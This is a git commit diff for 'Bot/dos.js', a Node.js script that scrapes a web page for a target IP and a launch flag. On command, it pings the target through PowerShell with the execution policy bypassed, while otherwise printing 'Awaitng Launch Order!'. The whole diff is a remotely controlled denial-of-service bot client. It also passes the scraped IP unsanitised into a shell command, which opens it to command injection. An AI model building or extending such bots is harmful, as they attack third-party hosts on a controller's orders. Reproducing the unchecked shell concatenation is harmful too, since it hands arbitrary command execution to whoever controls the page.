7cf7d1a9de64782dd20be925ed90a00c94d06fca
NukeZ <brycelogue@gmail.com>
2019-05-18 21:25:30 -0500

    You can now ping a targeted ip

--- Bot/dos.js
+++ Bot/dos.js
@@ -1,6 +1,8 @@
 const request = require('request');
 const cheerio = require('cheerio');
 var ping = require('ping');
+var fs = require('fs');
+const Shell = require('node-powershell');
 
 setInterval(function () {
 
@@ -11,13 +13,48 @@ setInterval(function () {
             const ip = $('.ip');
             const output = ip.find('p').text();
 
-            var hosts = [output];
-            hosts.forEach(function (host) {
-                ping.sys.probe(host, function (isAlive) {
-                    var msg = isAlive ? 'host ' + host + ' is alive' : 'host ' + host + ' is dead';
-                    console.log(msg);
-                });
+            const check = $('.check');
+            const gotime = check.find('p').text();
+
+            var current = fs.readFile("ip.txt", function(err, current){
+                // console.log("IP: " + output + ", Active: " + gotime + ", Current IP: " + current.toString());
             });
+
+            // if (output != current) {
+            //     fs.writeFile("ip.txt", output, (err) => {
+            //         if (err) console.log(err);
+            //         console.log("Updated IP to " + output);
+            //       });
+            // }
+
+            if (gotime == 1) {
+
+                const ps = new Shell({
+                    executionPolicy: 'Bypass',
+                    noProfile: true
+                  });
+                   
+                  ps.addCommand('ping ' + output);
+                  ps.invoke()
+                  .then(output => {
+                    console.log(output);
+                  })
+                  .catch(err => {
+                    console.log(err);
+                  });
+
+                // var hosts = [output];
+                // hosts.forEach(function (host) {
+                //     ping.sys.probe(host, function (isAlive) {
+                //         var msg = isAlive ? 'IP ' + host + ' is being PINGED' : 'host ' + host + ' is not avalible';
+                //         console.log(msg);
+                //     });
+                // });
+            }
+            
+            if (gotime != '1') {
+                console.log("Awaitng Launch Order!")
+            }
         }
     });
-}, 1000);
+}, 10000);
